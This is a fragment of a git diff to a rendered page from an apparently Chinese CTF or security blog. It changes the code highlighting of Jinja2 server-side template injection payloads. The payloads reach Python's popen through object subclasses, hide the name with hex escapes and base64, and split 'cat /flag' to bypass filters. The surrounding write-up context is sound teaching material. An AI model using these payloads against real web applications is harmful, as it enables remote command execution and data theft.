+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">xx</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x70\x6f\x70\x65\x6e</span><span class="s1">&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">3.base64 编码绕过，payload:
-</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">base64.b64decode(&#39;cG9wZW4=&#39;).decode()</span>](<span class="na">&#39;cat /fl&#39; + &#39;ag&#39;</span>).read() }}</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span><span class="n">base64编码绕过</span><span class="err">，</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">xx</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;cG9wZW4=&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()](</span><span class="s1">&#39;cat /fl&#39;</span> <span class="o">+</span> <span class="s1">&#39;ag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span></span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 </ul>
@@ -460,7 +460,7 @@
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title="更新于 2025-04-20 20:38:20">更新于 2025-04-20&nbsp;</span>
+        <span title="更新于 2025-04-20 20:54:37">更新于 2025-04-20&nbsp;</span>
       </div><div class="post-info-license">
             <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
           </div></div><div class="post-info-line">
